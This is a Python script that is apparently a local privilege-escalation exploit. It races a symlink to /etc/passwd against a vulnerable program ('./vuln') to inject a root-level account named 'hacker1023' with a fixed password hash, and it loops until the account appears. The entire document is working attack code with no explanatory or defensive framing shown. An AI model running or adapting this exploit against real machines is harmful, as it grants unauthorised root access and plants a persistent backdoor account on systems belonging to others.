import os
import sys
import threading
import subprocess

def execute ():
    subprocess . call (['./vuln', 'hacker1023:U6aMy0wojraho:0:0::/root:/bin/bash', '&'], stdout = subprocess . PIPE, stderr = subprocess . PIPE)

def exploit ():
    subprocess . call (['ln', '-s', '/etc/passwd', 'temp'], stdout = subprocess . PIPE, stderr = subprocess . PIPE)

if __name__ == '__main__':
    while (True):
        f = open ('/etc/passwd', 'rt')
        check = f . read ()
        if check . find ('hacker1023') != -1:
                print ("Exploit success!!")
                break

        th1 = threading . Thread (target = execute)
        th2 = threading . Thread (target = exploit)

        th1 . start ()
        th2 . start ()
